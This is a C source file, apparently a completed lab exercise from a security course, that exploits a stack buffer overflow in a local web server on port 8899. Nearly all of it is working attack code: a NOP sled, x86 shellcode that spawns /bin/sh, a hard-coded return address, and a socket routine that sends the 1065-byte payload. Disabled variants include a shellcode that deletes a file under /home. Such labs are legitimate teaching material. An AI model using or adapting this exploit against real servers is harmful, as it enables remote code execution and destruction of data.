#include <stdio.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>
#include <fcntl.h>
#include <sys/shm.h>

#define PORT  8899

/*
** construct your shellcode
**create_shellcode.c will help you to create a shellcode.
**fill in it there

  const char shellcode[] = ;

*/
#if 1
  const char shellcode[] =
    "\x31\xc0"
    "\x50"
    "\x68""//sh"
    "\x68""/bin"
    "\x89\xe3"
    "\x50"
    "\x53"
    "\x89\xe1"
    "\x99"
    "\xb0\x0b"
    "\xcd\x80" ;

#endif

#if 0
  const char shellcode[] ="\xeb\xfe";

#endif

#if 0
  const char shellcode[] = "\x31\xc0\x50\x68\x2e\x74\x78\x74\x68\x73\x2f\x61\x61\x68\x65\x2f\x7a\x6c\x68\x2f\x68\x6f\x6d\x89\xe3\xb0\x0a\xcd\x80\x31\xdb\xb0\x01\xcd\x80";
#endif

int main(int argc, char *argv[])
{
  int  port = PORT;
  if (argc>1)
    port = atoi(argv[1]);

  int sock_client = socket(AF_INET,SOCK_STREAM, 0);//sock fd

  struct sockaddr_in addr;
  memset(&addr, 0, sizeof(addr));
  addr.sin_family = AF_INET;
  addr.sin_port = htons(port);  //server port

  addr.sin_addr.s_addr = inet_addr("127.0.0.1");  ///server ip address


  if (connect(sock_client, (struct sockaddr *)&addr, sizeof(addr)) < 0)
    {
      perror("connect");
      exit(1);
    }

  printf("sock_client = %d\n",sock_client);


  /*
    your task is to exploit your attack..
    step1 : define a buffer array
    step2 : construct a attack shellcode to the buffer
    step3 : send the buffer to web server to realize your attack
    remember that you must send a request which end up with "\r\n\r\n",if you
    want your browser receice the answer response from server
  */

  //code fill in it

  /*
    below show that client send a normal request to the web server
    you should fix the code to realize your attack
  */
#if 1
    char buffer[2048];
    long jmp_addr=0xffffd9e8;
    char *ptr =buffer;
    long *addr_ptr = (long *)ptr;
    int i;

    for(i=0; i<1064; i+=4)
        *(addr_ptr++) = jmp_addr;
    for(i=0; i<1064/2; ++i)
        buffer[i] = 0x90;
    ptr =buffer +( (1064/2) -strlen(shellcode)/2);
    for(i=0; i<strlen(shellcode); ++i)
        * (ptr++) = shellcode[i];
    buffer[1064]=' ';
     write(sock_client,buffer,1065);
#endif

#if 0
  char req_over[2048];
  memset(req_over, 'A', 2048);
  write(sock_client,req_over ,1065);
#endif

#if 0
  char *req ="GET / HTTP/1.1\r\n\r\n";
  write(sock_client,req,strlen(req));
#endif
  //receive the response from web server
  char resp[1024];
  int num = 0;
  while(read (sock_client, &resp[num], 1))
	num++;
  resp[num] = 0;
  printf("Response = %s\n",resp);

  close(sock_client);


 return 0;
}
